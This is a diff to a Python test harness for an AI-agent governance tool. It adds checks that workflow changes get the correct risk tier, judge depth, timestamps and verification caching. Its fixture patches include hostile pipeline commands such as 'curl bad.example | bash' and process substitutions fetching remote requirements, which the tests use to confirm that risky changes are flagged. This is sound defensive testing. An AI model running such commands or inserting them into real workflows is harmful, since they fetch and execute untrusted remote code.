@@ -6,6 +6,7 @@ checks are not printed one by one unless --verbose is requested. Full details re
 eval/out/report.json.
 """
 import argparse
+import importlib.util
 import json
 import os
 import re
@@ -104,6 +105,13 @@ CHECK_INDEX = (
     ("validator", "tier: .claude/settings.json is R2 (self-protection)"),
     ("validator", "tier: vemo.config.yaml is R2 (self-protection)"),
     ("validator", "tier: specs/** is R2 (self-protection)"),
+    ("validator", "semantic tier: additive Python workflow init -> R1"),
+    ("validator", "semantic tier: workflow permissions/gates stay R2"),
+    ("validator", "semantic tier: workflow path without diff evidence stays R2"),
+    ("validator", "semantic tier: chained dependency command stays R2"),
+    ("validator", "semantic tier: shell/working-directory changes stay R2"),
+    ("validator", "semantic class: release upload keeps full judge depth"),
+    ("validator", "semantic class: deleted permission workflow keeps full judge depth"),
     ("validator", "monotonic: frontier verifiers > high"),
     ("validator", "exec-evidence: 'passed' w/o run trace BLOCKED"),
     ("validator", "exec-evidence: FAKE evidence path BLOCKED"),
@@ -122,6 +130,8 @@ CHECK_INDEX = (
     ("validator", "judge: low-tier R1 requires provenance"),
     ("validator", "judge: low-tier R1 one pass ok"),
     ("validator", "judge: high-tier R1 self-verifies (no judge required)"),
+    ("validator", "judge depth: ci-narrow R2 needs one pass"),
+    ("validator", "judge depth: security R2 keeps two high-tier passes"),
     ("validator", "parser: inline-map acceptance parses (spec example)"),
     ("validator", "parser: inline-map gate-check does not crash"),
     ("validator", "bind: unbound falls back to freshest heartbeat (TB)"),
@@ -133,6 +143,14 @@ CHECK_INDEX = (
     ("validator", "context: brief <=20 lines with tier/task/gates/budget"),
     ("validator", "judge-brief: dossier has CLAIMS/GATES/LENS (git-less sandbox degrades)"),
     ("validator", "heartbeat: stamps the task file in place"),
+    ("validator", "UTC: task tools, heartbeat, judge, receipt, budget end in Z"),
+    ("validator", "judge-brief: staged diff excludes unrelated untracked files"),
+    ("validator", "judge-brief: invalid explicit range fails closed"),
+    ("validator", "verification profile: focused runs exactly test/lint/smoke"),
+    ("validator", "verification profile: release adds package scan"),
+    ("validator", "verification contract: release class requires release profile"),
+    ("validator", "verification cache: hit, unrelated stability, in-scope invalidation"),
+    ("validator", "runtime: python3 command uses current interpreter on Windows"),
     ("validator", "multi-task acceptance: unaccepted sibling in range BLOCKED"),
     ("validator", "tier: .gitignore is R2 (audit visibility)"),
     ("hook", "hook e2e: in-scope edit exit 0"),
@@ -151,6 +169,9 @@ CHECK_INDEX = (
     ("hook", "hook e2e: session-start exit 0 + orientation"),
     ("hook", "hook e2e: telemetry recorded blocks + session_start"),
     ("git", "pre-commit e2e: staged secret exits 1 + reason"),
+    ("git", "pre-commit e2e: release cannot downgrade to security class"),
+    ("git", "pre-commit e2e: workflow rename-out stays security R2"),
+    ("git", "judge provenance: staged snapshot change invalidates old passes"),
     ("git", "pre-commit e2e: range with multiple task scopes exits 0"),
     ("hook", "hook e2e: task-approved destructive cmd allowed + logged"),
     ("hook", "hook e2e: Stop below acceptance -> exit 0 + reminder"),
@@ -162,6 +183,7 @@ CHECK_INDEX = (
     ("budget", "stuck-loop: 3x same Bash + human -> advisory exit 0"),
     ("budget", "stuck-loop: 3x same Bash + auto ON -> hard stop exit 2"),
     ("auto", "auto: enable w/o TTY REFUSED (agent cannot self-enable)"),
+    ("auto", "auto: state and audit timestamps are UTC Z"),
     ("skill", "skill-score: VEMO's own skills pass the quality bar"),
     ("skill", "skill-audit: catalog<->disk parity + no dangling backing scripts"),
     ("skill", "skill_check selftest passes"),
@@ -345,8 +367,8 @@ def remove_tree(path):
 
 
 def task(scope, state="ImplementationDone", risk="R1", status="not_run", build_exit="null",
-         evidence="", trifecta="[]", verdict="null", approved="[]", task_id="T"):
-    return (f"---\nid: {task_id}\nrisk: {risk}\nstate: {state}\nscope_in: {scope}\ntrifecta: {trifecta}\n"
+         evidence="", trifecta="[]", verdict="null", approved="[]", task_id="T", change_class="standard"):
+    return (f"---\nid: {task_id}\nrisk: {risk}\nchange_class: {change_class}\nstate: {state}\nscope_in: {scope}\ntrifecta: {trifecta}\n"
             f"acceptance:\n  status: {status}\n  build_exit: {build_exit}\n  smoke_exit: 0\n  evidence: \"{evidence}\"\n"
             f"judge:\n  required: false\n  verdict: {verdict}\napproved_commands: {approved}\n"
             f"owning_chat: c\nheartbeat: 2026-06-16T20:00\n---\n")
@@ -389,6 +411,81 @@ def run_validator_checks(r):
     r.chk("validator", "tier: .claude/settings.json is R2 (self-protection)", run(d, "tier-required", "--paths", ".claude/settings.json"), lambda g: g == "R2")
     r.chk("validator", "tier: vemo.config.yaml is R2 (self-protection)", run(d, "tier-required", "--paths", "vemo.config.yaml"), lambda g: g == "R2")
     r.chk("validator", "tier: specs/** is R2 (self-protection)", run(d, "tier-required", "--paths", "specs/safety.spec.md"), lambda g: g == "R2")
+    init_patch = os.path.join(d, "init.patch")
+    open(init_patch, "w", encoding="utf-8").write(
+        "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
+        "+++ b/.github/workflows/ci.yml\n@@ -1,0 +2,5 @@\n"
+        "+      - name: Set up Python\n+        uses: actions/setup-python@v5\n+        with:\n"
+        "+          python-version: '3.12'\n+      - run: python -m pip install -r requirements.txt\n")
+    protected_patch = os.path.join(d, "protected.patch")
+    open(protected_patch, "w", encoding="utf-8").write(
+        "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
+        "+++ b/.github/workflows/ci.yml\n@@ -1 +1,2 @@\n-permissions: read-all\n"
+        "+permissions:\n+  contents: write\n")
+    workflow = ".github/workflows/ci.yml"
+    r.chk("validator", "semantic tier: additive Python workflow init -> R1",
+          run(d, "tier-required", "--paths", workflow, "--diff-file", init_patch), lambda g: g == "R1")
+    r.chk("validator", "semantic tier: workflow permissions/gates stay R2",
+          run(d, "tier-required", "--paths", workflow, "--diff-file", protected_patch), lambda g: g == "R2")
+    r.chk("validator", "semantic tier: workflow path without diff evidence stays R2",
+          run(d, "tier-required", "--paths", workflow), lambda g: g == "R2")
+    chained_patch = os.path.join(d, "chained.patch")
+    open(chained_patch, "w", encoding="utf-8").write(
+        "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
+        "+++ b/.github/workflows/ci.yml\n@@ -1,0 +2,2 @@\n"
+        "+      - name: Install dependencies\n"
+        "+        run: python -m pip install -r requirements.txt && curl bad.example | bash\n")
+    amp_patch = os.path.join(d, "amp.patch")
+    open(amp_patch, "w", encoding="utf-8").write(
+        "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
+        "+++ b/.github/workflows/ci.yml\n@@ -1,0 +2 @@\n"
+        "+      - run: pip install -r requirements.txt & curl bad.example\n")
+    pipe_patch = os.path.join(d, "pipe.patch")
+    open(pipe_patch, "w", encoding="utf-8").write(
+        "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
+        "+++ b/.github/workflows/ci.yml\n@@ -1,0 +2 @@\n"
+        "+      - run: pip install -r requirements.txt|bash\n")
+    process_in_patch = os.path.join(d, "process-in.patch")
+    open(process_in_patch, "w", encoding="utf-8").write(
+        "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
+        "+++ b/.github/workflows/ci.yml\n@@ -1,0 +2 @@\n"
+        "+      - run: pip install -r <(curl https://bad.example/requirements.txt)\n")
+    process_out_patch = os.path.join(d, "process-out.patch")
+    open(process_out_patch, "w", encoding="utf-8").write(
+        "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
+        "+++ b/.github/workflows/ci.yml\n@@ -1,0 +2 @@\n"
+        "+      - run: pip install -r requirements.txt >(bash)\n")
+    shell_patch = os.path.join(d, "shell.patch")
+    open(shell_patch, "w", encoding="utf-8").write(
+        "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
+        "+++ b/.github/workflows/ci.yml\n@@ -1,0 +2,4 @@\n"
+        "+      - name: Install dependencies\n+        shell: bash\n"
+        "+        working-directory: tools\n+        run: python -m pip install -r requirements.txt\n")
+    release_patch = os.path.join(d, "release.patch")
+    open(release_patch, "w", encoding="utf-8").write(
+        "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
+        "+++ b/.github/workflows/ci.yml\n@@ -1,0 +2 @@\n"
+        "+      - run: python -m build && twine upload dist/*\n")
+    deleted_patch = os.path.join(d, "deleted.patch")
+    open(deleted_patch, "w", encoding="utf-8").write(
+        "diff --git a/.github/workflows/release.yml b/.github/workflows/release.yml\n"
+        "deleted file mode 100644\n--- a/.github/workflows/release.yml\n+++ /dev/null\n@@ -1,2 +0,0 @@\n"
+        "-permissions:\n-  contents: write\n")
+    r.chk("validator", "semantic tier: chained dependency command stays R2",
+          tuple(run(d, "tier-required", "--paths", workflow, "--diff-file", patch)
+                for patch in (chained_patch, amp_patch, pipe_patch, process_in_patch, process_out_patch)),
+          lambda g: g == ("R2", "R2", "R2", "R2", "R2"))
+    r.chk("validator", "semantic tier: shell/working-directory changes stay R2",
+          run(d, "tier-required", "--paths", workflow, "--diff-file", shell_patch), lambda g: g == "R2")
+    release_class = run(d, "change-class", "--paths", workflow, "--diff-file", release_patch)
+    release_depth = run(d, "verify-plan", "--risk", "R2", "--change-class", release_class)
+    r.chk("validator", "semantic class: release upload keeps full judge depth", (release_class, release_depth),
+          lambda g: g[0] == "release" and vnum(g[1]) == 2)
+    deleted_class = run(d, "change-class", "--paths", ".github/workflows/release.yml",
+                        "--diff-file", deleted_patch)
+    deleted_depth = run(d, "verify-plan", "--risk", "R2", "--change-class", deleted_class)
+    r.chk("validator", "semantic class: deleted permission workflow keeps full judge depth",
+          (deleted_class, deleted_depth), lambda g: g[0] == "security" and vnum(g[1]) == 2)
     remove_tree(d)
 
     dh, df = sandbox(tier="high"), sandbox(tier="frontier")
@@ -454,6 +551,18 @@ def run_validator_checks(r):
     d = sandbox(tier="high", task=task('["src/**"]', risk="R1", verdict="null"))
     r.chk("validator", "judge: high-tier R1 self-verifies (no judge required)", run(d, "gate-check", "--gate", "required-judge"), lambda g: g == "ok")
     remove_tree(d)
+    d = sandbox(tier="high", task=task('[".github/workflows/**"]', risk="R2", verdict="pass",
+                                       change_class="ci-narrow"))
+    run(d, "judge-record", "--task", "T", "--verdict", "pass", "--evidence", "ci")
+    r.chk("validator", "judge depth: ci-narrow R2 needs one pass",
+          run(d, "gate-check", "--gate", "required-judge"), lambda g: g == "ok")
+    remove_tree(d)
+    d = sandbox(tier="high", task=task('["enforcement/**"]', risk="R2", verdict="pass",
+                                       change_class="security"))
+    run(d, "judge-record", "--task", "T", "--verdict", "pass", "--evidence", "security")
+    r.chk("validator", "judge depth: security R2 keeps two high-tier passes",
+          run(d, "gate-check", "--gate", "required-judge"), "judge-pass-count=1")
+    remove_tree(d)
 
     d = sandbox(task=("---\nid: T\nrisk: R1\nstate: ImplementationDone\nscope_in: [\"src/**\"]\n"
                       "acceptance: { status: passed, build_exit: 0, smoke_exit: 0, evidence: \".vemo/run/1.log\" }\n"
@@ -494,6 +603,123 @@ def run_validator_checks(r):
     r.chk("validator", "heartbeat: stamps the task file in place", hb,
           lambda g: g.startswith("heartbeat:T=") and "heartbeat: 2026-06-16T20:00" not in body)
     remove_tree(d)
+
+    # Tool-owned UTC timestamps across task lifecycle, audit, budget, and verification receipts.
+    d = sandbox()
+    created = run(d, "task-create", "--title", "utc-check", "--risk", "R1",
+                  "--change-class", "standard", "--scope", "src/**", "--profile", "full")
+    rel = created.split("created:", 1)[-1]
+    task_path = os.path.join(d, rel)
+    run(d, "task-state", "--state", "ReviewApproved", "--task-file", task_path)
+    run(d, "task-note", "--message", "machine timestamp", "--task-file", task_path)
+    run(d, "judge-record", "--task", "utc-check", "--verdict", "pass")
+    run(d, "budget-reset", "--session", "utc")
+    task_text = open(task_path, encoding="utf-8").read()
+    judge_row = json.loads(open(os.path.join(d, ".vemo", "judge.jsonl"), encoding="utf-8").readline())
+    budget_row = json.load(open(os.path.join(d, ".vemo", "run-utc.json"), encoding="utf-8"))
+    d2 = sandbox(task=task('["src/**"]'),
+                 cfg_sub=[(r'(?m)^(\s*build:\s*)""', r'\1python3 pass.py')])
+    open(os.path.join(d2, "pass.py"), "w", encoding="utf-8").write("pass\n")
+    run(d2, "verify-run", "--no-cache")
+    receipt_row = json.load(open(os.path.join(d2, ".vemo", "run", "receipt.json"), encoding="utf-8"))
+    utc_values = re.findall(r"\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ", task_text)
+    r.chk("validator", "UTC: task tools, heartbeat, judge, receipt, budget end in Z",
+          (created, utc_values, judge_row.get("ts"), budget_row.get("started"), receipt_row.get("ts")),
+          lambda g: g[0].startswith("created:") and len(g[1]) >= 3
+          and all(str(value).endswith("Z") for value in g[2:]))
+    remove_tree(d); remove_tree(d2)
+
+    # Judge dossier reads the staged index only, excluding another task's untracked worktree files.
+    d = sandbox(task=task('["src/**"]'))
+    subprocess.run(["git", "init"], cwd=d, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+    os.makedirs(os.path.join(d, "src")); os.makedirs(os.path.join(d, "other"))
+    open(os.path.join(d, "src", "staged.py"), "w", encoding="utf-8").write("x = 1\n")
+    open(os.path.join(d, "other", "foreign.py"), "w", encoding="utf-8").write("x = 2\n")
+    subprocess.run(["git", "add", "src/staged.py"], cwd=d, check=True)
+    dossier = run(d, "judge-brief")
+    r.chk("validator", "judge-brief: staged diff excludes unrelated untracked files", dossier,
+          lambda g: "src/staged.py" in g and "other/foreign.py" not in g and "staged index" in g)
+    invalid = subprocess.run(
+        [sys.executable, VAL, "judge-brief", "--range", "definitely-not-a-valid-range...HEAD"],
+        capture_output=True, text=True, encoding="utf-8", errors="replace", env=child_env(VEMO_ROOT=d))
+    option_range = subprocess.run(
+        [sys.executable, VAL, "judge-brief", "--range=--cached"], capture_output=True, text=True,
+        encoding="utf-8", errors="replace", env=child_env(VEMO_ROOT=d))
+    empty_range = subprocess.run(
+        [sys.executable, VAL, "judge-brief", "--range="], capture_output=True, text=True,
+        encoding="utf-8", errors="replace", env=child_env(VEMO_ROOT=d))
+    r.chk("validator", "judge-brief: invalid explicit range fails closed",
+          tuple((p.returncode, p.stdout + p.stderr) for p in (invalid, option_range, empty_range)),
+          lambda g: all(code == 3 and "error:" in output for code, output in g))
+    remove_tree(d)
+
+    def profile_task(profile, commands=""):
+        base = task('["src/**"]')
+        return base.replace("acceptance:\n", "verification:\n  profile: %s\n%sacceptance:\n" % (profile, commands))
+
+    def marker_fixture(profile, commands, cfg_sub=()):
+        root = sandbox(task=profile_task(profile, commands), cfg_sub=cfg_sub)
+        subprocess.run(["git", "init"], cwd=root, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+        os.makedirs(os.path.join(root, "src")); os.makedirs(os.path.join(root, ".vemo", "run"), exist_ok=True)
+        open(os.path.join(root, "src", "x.py"), "w", encoding="utf-8").write("x = 1\n")
+        open(os.path.join(root, ".vemo", "run", "mark.py"), "w", encoding="utf-8").write(
+            "from pathlib import Path\nimport sys\np=Path('.vemo/run/marks.txt')\n"
+            "p.write_text((p.read_text() if p.exists() else '') + sys.argv[1] + '\\n')\n")
+        return root
+
+    focused_commands = ("  commands:\n"
+                        "    test: python3 .vemo/run/mark.py test\n"
+                        "    lint: python3 .vemo/run/mark.py lint\n"
+                        "    smoke: python3 .vemo/run/mark.py smoke\n")
+    d = marker_fixture("focused", focused_commands)
+    first = run(d, "verify-run", "--no-cache")
+    marks = open(os.path.join(d, ".vemo", "run", "marks.txt"), encoding="utf-8").read().splitlines()
+    r.chk("validator", "verification profile: focused runs exactly test/lint/smoke", (first, marks),
+          lambda g: g[0].startswith("pass") and g[1] == ["test", "lint", "smoke"])
+    remove_tree(d)
+
+    release_cfg = [
+        (r'(?m)^(\s*build:\s*)""', r'\1python3 .vemo/run/mark.py build'),
+        (r'(?m)^(\s*smoke:\s*)""', r'\1python3 .vemo/run/mark.py smoke'),
+        (r'(?m)^(\s*package_scan:\s*)""', r'\1python3 .vemo/run/mark.py scan'),
+    ]
+    d = marker_fixture("release", "", release_cfg)
+    released = run(d, "verify-run", "--no-cache")
+    marks = open(os.path.join(d, ".vemo", "run", "marks.txt"), encoding="utf-8").read().splitlines()
+    r.chk("validator", "verification profile: release adds package scan", (released, marks),
+          lambda g: g[0].startswith("pass") and g[1] == ["build", "smoke", "scan"])
+    remove_tree(d)
+
+    release_full = task('[".github/workflows/**"]', risk="R2", change_class="release").replace(
+        "acceptance:\n", "verification:\n  profile: full\nacceptance:\n")
+    d = sandbox(task=release_full)
+    r.chk("validator", "verification contract: release class requires release profile",
+          run(d, "gate-check", "--gate", "verification-contract"),
+          "release-requires-verification-profile=release")
+    remove_tree(d)
+
+    d = marker_fixture("focused", focused_commands)
+    first = run(d, "verify-run")
+    count1 = len(open(os.path.join(d, ".vemo", "run", "marks.txt"), encoding="utf-8").read().splitlines())
+    second = run(d, "verify-run")
+    os.makedirs(os.path.join(d, "other"))
+    open(os.path.join(d, "other", "foreign.txt"), "w", encoding="utf-8").write("unrelated\n")
+    third = run(d, "verify-run")
+    count3 = len(open(os.path.join(d, ".vemo", "run", "marks.txt"), encoding="utf-8").read().splitlines())
+    open(os.path.join(d, "src", "x.py"), "a", encoding="utf-8").write("x = 2\n")
+    fourth = run(d, "verify-run")
+    count4 = len(open(os.path.join(d, ".vemo", "run", "marks.txt"), encoding="utf-8").read().splitlines())
+    r.chk("validator", "verification cache: hit, unrelated stability, in-scope invalidation",
+          (first, second, third, fourth, count1, count3, count4),
+          lambda g: g[0].startswith("pass") and "cached=true" in g[1] and "cached=true" in g[2]
+          and "cached=false" in g[3] and g[4] == g[5] == 3 and g[6] == 6)
+    remove_tree(d)
+
+    spec = importlib.util.spec_from_file_location("vemo_task_state_eval", VAL)
+    module = importlib.util.module_from_spec(spec); spec.loader.exec_module(module)
+    runtime_cmd = module._runtime_command("python3 eval/run.py")
+    r.chk("validator", "runtime: python3 command uses current interpreter on Windows", runtime_cmd,
+          lambda g: (g.startswith('"' + sys.executable + '"') if os.name == "nt" else bool(g)))
 
     d = sandbox(task=task('["src/a/**"]', state="AcceptancePassed", risk="R1", status="passed",
                           build_exit="0", evidence=".vemo/run/1.log", task_id="TA"))
@@ -556,7 +782,8 @@ def run_hook_checks(r):
     r.chk("hook", "hook e2e: session-start exit 0 + orientation", (rc, err), lambda g: g[0] == 0)
     tele = open(os.path.join(d, ".vemo", "telemetry.jsonl"), encoding="utf-8").read()
     r.chk("hook", "hook e2e: telemetry recorded blocks + session_start", tele,
-          lambda g: "scope_block_out" in g and "session_start" in g)
+          lambda g: "scope_block_out" in g and "session_start" in g
+          and all(json.loads(line).get("ts", "").endswith("Z") for line in g.splitlines() if line.strip()))
     remove_tree(d)
 
     d = sandbox(task=task('["src/**"]', approved='["git reset --hard HEAD~1"]'))
@@ -632,6 +859,79 @@ def run_git_checks(r):
           lambda g: p.returncode == 1 and "secret-scan" in g)
     remove_tree(d)
 
+    d = sandbox(task=task(
+        '[".github/workflows/**", "tasks/T.md", ".vemo/judge.jsonl"]', risk="R2",
+        verdict="pass", change_class="security"))
+    install_precommit_fixture(d)
+    os.makedirs(os.path.join(d, ".github", "workflows"), exist_ok=True)
+    open(os.path.join(d, ".github", "workflows", "release.yml"), "w", encoding="utf-8").write(
+        "name: release\njobs:\n  publish:\n    steps:\n      - run: python -m build && twine upload dist/*\n")
+    subprocess.run(["git", "add", "tasks/T.md", ".github/workflows/release.yml"],
+                   cwd=d, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+    run(d, "judge-record", "--task", "T", "--verdict", "pass", "--evidence", "release-1")
+    run(d, "judge-record", "--task", "T", "--verdict", "pass", "--evidence", "release-2")
+    subprocess.run(["git", "add", ".vemo/judge.jsonl"],
+                   cwd=d, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+    p = subprocess.run([BASH, "enforcement/ci/pre-commit"], cwd=d, capture_output=True, text=True,
+                       env=child_env(), encoding="utf-8", errors="replace")
+    r.chk("git", "pre-commit e2e: release cannot downgrade to security class", p.stdout + p.stderr,
+          lambda g: p.returncode == 1 and "change-class downgrade" in g and "requires release" in g)
+    remove_tree(d)
+
+    d = sandbox()
+    install_precommit_fixture(d)
+    subprocess.run(["git", "config", "user.email", "eval@example.invalid"], cwd=d, check=True)
+    subprocess.run(["git", "config", "user.name", "VEMO Eval"], cwd=d, check=True)
+    os.makedirs(os.path.join(d, ".github", "workflows"), exist_ok=True)
+    old_workflow = os.path.join(d, ".github", "workflows", "ci.yml")
+    open(old_workflow, "w", encoding="utf-8").write("permissions:\n  contents: write\n")
+    subprocess.run(["git", "add", ".github/workflows/ci.yml"], cwd=d, check=True)
+    subprocess.run(["git", "commit", "-m", "base workflow"], cwd=d,
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+    open(os.path.join(d, "tasks", "T.md"), "w", encoding="utf-8").write(
+        task('[".github/workflows/**", "disabled/**", "tasks/T.md"]', risk="R1",
+             change_class="standard"))
+    os.makedirs(os.path.join(d, "disabled"), exist_ok=True)
+    os.replace(old_workflow, os.path.join(d, "disabled", "ci.yml"))
+    subprocess.run(["git", "add", "-A"], cwd=d, check=True)
+    p = subprocess.run([BASH, "enforcement/ci/pre-commit"], cwd=d, capture_output=True, text=True,
+                       env=child_env(), encoding="utf-8", errors="replace")
+    r.chk("git", "pre-commit e2e: workflow rename-out stays security R2", p.stdout + p.stderr,
+          lambda g: p.returncode == 1 and "require R2" in g and "requires security" in g)
+    remove_tree(d)
+
+    d = sandbox(task=task('["src/**", "tasks/**", ".vemo/judge.jsonl"]', risk="R2", verdict="null",
+                          change_class="security"))
+    install_precommit_fixture(d)
+    os.makedirs(os.path.join(d, "src"), exist_ok=True)
+    source = os.path.join(d, "src", "x.py")
+    open(source, "w", encoding="utf-8").write("x = 1\n")
+    template_path = os.path.join(d, "tasks", "_TASK_TEMPLATE.md")
+    template_initial = "---\njudge:\n  verdict: null\n---\n"
+    open(template_path, "w", encoding="utf-8").write(template_initial)
+    subprocess.run(["git", "add", "tasks/T.md", "tasks/_TASK_TEMPLATE.md", "src/x.py"], cwd=d, check=True)
+    run(d, "judge-record", "--task", "T", "--verdict", "pass", "--evidence", "snapshot-1")
+    run(d, "judge-record", "--task", "T", "--verdict", "pass", "--evidence", "snapshot-2")
+    task_path = os.path.join(d, "tasks", "T.md")
+    task_text = open(task_path, encoding="utf-8").read().replace("verdict: null", "verdict: pass")
+    open(task_path, "w", encoding="utf-8").write(task_text)
+    subprocess.run(["git", "add", "tasks/T.md", ".vemo/judge.jsonl"], cwd=d, check=True)
+    before = run(d, "gate-check", "--gate", "required-judge")
+    open(template_path, "w", encoding="utf-8").write(template_initial.replace("null", "pass"))
+    subprocess.run(["git", "add", "tasks/_TASK_TEMPLATE.md"], cwd=d, check=True)
+    template_after = run(d, "gate-check", "--gate", "required-judge")
+    open(template_path, "w", encoding="utf-8").write(template_initial)
+    subprocess.run(["git", "add", "tasks/_TASK_TEMPLATE.md"], cwd=d, check=True)
+    restored = run(d, "gate-check", "--gate", "required-judge")
+    open(source, "w", encoding="utf-8").write("x = 2\n")
+    subprocess.run(["git", "add", "src/x.py"], cwd=d, check=True)
+    after = run(d, "gate-check", "--gate", "required-judge")
+    r.chk("git", "judge provenance: staged snapshot change invalidates old passes",
+          (before, template_after, restored, after),
+          lambda g: g[0] == "ok" and "judge-pass-count=0" in g[1]
+          and g[2] == "ok" and "judge-pass-count=0" in g[3])
+    remove_tree(d)
+
     d = sandbox()
     install_precommit_fixture(d)
     subprocess.run(["git", "config", "user.email", "eval@example.invalid"], cwd=d, check=True)
@@ -645,9 +945,11 @@ def run_git_checks(r):
         task('["src/core/**", "tasks/T1.md", ".vemo/judge.jsonl"]', state="AcceptancePassed", risk="R2",
              status="passed", build_exit="0", evidence=".vemo/run/1.log", verdict="pass", task_id="T1"))
     open(os.path.join(d, "src", "core", "x.py"), "w", encoding="utf-8").write("x = 1\n")
+    subprocess.run(["git", "add", "tasks/T1.md", "src/core/x.py"], cwd=d,
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
     run(d, "judge-record", "--task", "T1", "--verdict", "pass", "--evidence", "r2-1")
     run(d, "judge-record", "--task", "T1", "--verdict", "pass", "--evidence", "r2-2")
-    subprocess.run(["git", "add", "tasks/T1.md", "src/core/x.py", ".vemo/judge.jsonl"], cwd=d,
+    subprocess.run(["git", "add", ".vemo/judge.jsonl"], cwd=d,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
     subprocess.run(["git", "commit", "-m", "r2 task"], cwd=d,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
@@ -711,6 +1013,14 @@ def run_auto_checks(r):
                            input="", capture_output=True, text=True, encoding="utf-8", errors="replace",
                            env=child_env(VEMO_ROOT=tmp))
         r.chk("auto", "auto: enable w/o TTY REFUSED (agent cannot self-enable)", p.stdout, "REFUSED")
+        p = subprocess.run([sys.executable, os.path.join(ROOT, "enforcement", "automation", "vemo-auto"), "off"],
+                           capture_output=True, text=True, encoding="utf-8", errors="replace",
+                           env=child_env(VEMO_ROOT=tmp))
+        state = json.load(open(os.path.join(tmp, ".vemo", "auto_mode.json"), encoding="utf-8"))
+        audit = json.loads(open(os.path.join(tmp, ".vemo", "auto_decisions.jsonl"), encoding="utf-8").readline())
+        r.chk("auto", "auto: state and audit timestamps are UTC Z", (p.returncode, state, audit),
+              lambda g: g[0] == 0 and g[1].get("disabled_at", "").endswith("Z")
+              and g[2].get("ts", "").endswith("Z"))
     finally:
         remove_tree(tmp)
 
